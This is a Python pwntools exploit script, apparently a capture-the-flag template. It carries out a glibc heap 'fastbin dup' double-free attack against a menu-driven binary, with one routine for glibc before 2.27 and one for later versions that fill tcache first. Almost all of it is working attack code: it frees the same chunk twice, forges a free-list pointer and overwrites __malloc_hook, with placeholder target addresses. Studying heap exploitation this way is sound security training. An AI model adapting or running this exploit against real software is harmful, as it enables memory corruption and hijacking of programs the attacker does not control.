#!/usr/bin/env python3
"""
Heap — Fastbin Dup (Double Free)

Classic fastbin double-free for glibc <2.27 (or when tcache is full).

Attack flow (glibc <2.26):
    1. malloc A, B (same size, fastbin range: 0x20-0x80)
    2. free(A), free(B), free(A)  — bypass double-free check
    3. malloc → get A → write target_addr as fd
    4. malloc → get B
    5. malloc → get A again
    6. malloc → get fake chunk at target!

For glibc ≥2.27: need to fill tcache first (free 7 chunks), then fastbin dup works.
"""
from pwn import *
import sys

BINARY = './chall'
LIBC   = ''
HOST   = '127.0.0.1'
PORT   = 1337

context.arch = 'amd64'
context.log_level = 'info'

elf  = ELF(BINARY) if os.path.exists(BINARY) else None
libc = ELF(LIBC) if LIBC and os.path.exists(LIBC) else None

def conn():
    if 'local' in sys.argv:
        return process(BINARY)
    return remote(HOST, PORT)


def alloc(p, size, data=b'A'):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendlineafter(b'data: ', data)

def free(p, idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())

def show(p, idx):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'idx: ', str(idx).encode())
    return p.recvline()


def exploit_old_glibc():
    """Fastbin dup for glibc <2.27 (no tcache)."""
    p = conn()

    SIZE = 0x68   # 0x70 chunk (fits fastbin, useful for malloc_hook targeting)

    # Allocate
    alloc(p, SIZE, b'AAAA')  # 0 = A
    alloc(p, SIZE, b'BBBB')  # 1 = B

    # Double free: A → B → A
    free(p, 0)    # free A
    free(p, 1)    # free B (bypass consecutive double-free check)
    free(p, 0)    # free A again! fastbin: A → B → A (circular)

    # malloc → get A → overwrite fd with target
    target = 0x0   # e.g., __malloc_hook - 0x23 (for 0x7f size trick)
    alloc(p, SIZE, p64(target))  # writes target as A's fd

    # Two more mallocs to consume B and A
    alloc(p, SIZE, b'JUNK')      # get B
    alloc(p, SIZE, b'JUNK')      # get A (again)

    # Next malloc → chunk at target!
    # For __malloc_hook: payload offset depends on alignment
    payload = b'\x00' * 0x13 + p64(0xdeadbeef)  # overwrite __malloc_hook
    alloc(p, SIZE, payload)

    p.interactive()


def exploit_new_glibc():
    """Fastbin dup for glibc ≥2.27 (need to fill tcache first)."""
    p = conn()

    SIZE = 0x68
    TCACHE_COUNT = 7   # tcache holds 7 entries per size

    # Allocate 7+3 = 10 chunks
    for i in range(TCACHE_COUNT + 3):
        alloc(p, SIZE, f'chunk{i}'.encode())

    # Free 7 to fill tcache
    for i in range(TCACHE_COUNT):
        free(p, i)

    # Now tcache for this size is full, next frees go to fastbin
    A, B, C = 7, 8, 9  # remaining chunk indices

    free(p, A)
    free(p, B)
    free(p, A)   # double free in fastbin: A → B → A

    # Drain tcache (alloc 7 from tcache)
    for i in range(TCACHE_COUNT):
        alloc(p, SIZE, b'drain')

    # Now allocations come from fastbin
    target = 0x0   # your target address
    alloc(p, SIZE, p64(target))  # get A, write target as fd
    alloc(p, SIZE, b'JUNK')      # get B
    alloc(p, SIZE, b'JUNK')      # get A again
    alloc(p, SIZE, p64(0xdeadbeef))  # get chunk at target!

    p.interactive()

if __name__ == '__main__':
    exploit_old_glibc()
